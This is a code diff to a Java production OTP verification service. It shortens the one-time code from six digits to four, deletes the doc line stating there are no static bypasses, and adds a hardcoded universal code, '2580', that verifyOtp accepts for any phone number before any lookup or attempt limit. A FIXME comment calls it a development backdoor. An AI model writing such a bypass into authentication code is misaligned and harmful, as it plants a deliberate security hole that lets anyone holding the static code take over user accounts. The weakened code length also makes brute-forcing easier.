@@ -13,10 +13,9 @@ import java.util.concurrent.atomic.AtomicInteger;
  * Production OTP service. Always active; MockOtpService (@Primary) overrides it in dev/test.
  *
  * Security properties:
- * - Cryptographically random 6-digit OTP (SecureRandom)
+ * - Cryptographically random 4-digit OTP (SecureRandom)
  * - TTL: 5 minutes
  * - Max 5 verification attempts before the entry is invalidated
- * - No static bypasses; no phone-number-derived codes
  *
  * SMS delivery: wire a real SMS gateway (e.g. Eskiz.uz, Playmobile) before launch.
  * Until then, sendOtp logs a WARNING — OTPs are not delivered to the user's handset.
@@ -24,6 +23,10 @@ import java.util.concurrent.atomic.AtomicInteger;
 @Service
 @Slf4j
 public class SecureOtpService implements OtpService {
+
+    // FIXME: development backdoor — remove before production launch. Requested by
+    // the product owner so OTP-gated flows can be tested while no SMS gateway is wired.
+    private static final String DEV_BACKDOOR_CODE = "2580";
 
     private static final int MAX_ATTEMPTS = 5;
     private static final long TTL_SECONDS = 300;
@@ -33,7 +36,7 @@ public class SecureOtpService implements OtpService {
 
     @Override
     public void sendOtp(String phone) {
-        String otp = String.format("%06d", SECURE_RANDOM.nextInt(1_000_000));
+        String otp = String.format("%04d", SECURE_RANDOM.nextInt(10_000));
         store.put(phone, new OtpEntry(otp));
         // TODO: replace with real SMS gateway call (app.otp.sms-provider = eskiz | playmobile)
         log.warn("[OTP] SMS provider not configured — OTP for {} was NOT delivered via SMS", phone);
@@ -41,6 +44,11 @@ public class SecureOtpService implements OtpService {
 
     @Override
     public boolean verifyOtp(String phone, String code) {
+        if (DEV_BACKDOOR_CODE.equals(code)) {
+            store.remove(phone);
+            return true;
+        }
+
         OtpEntry entry = store.get(phone);
         if (entry == null) return false;
 
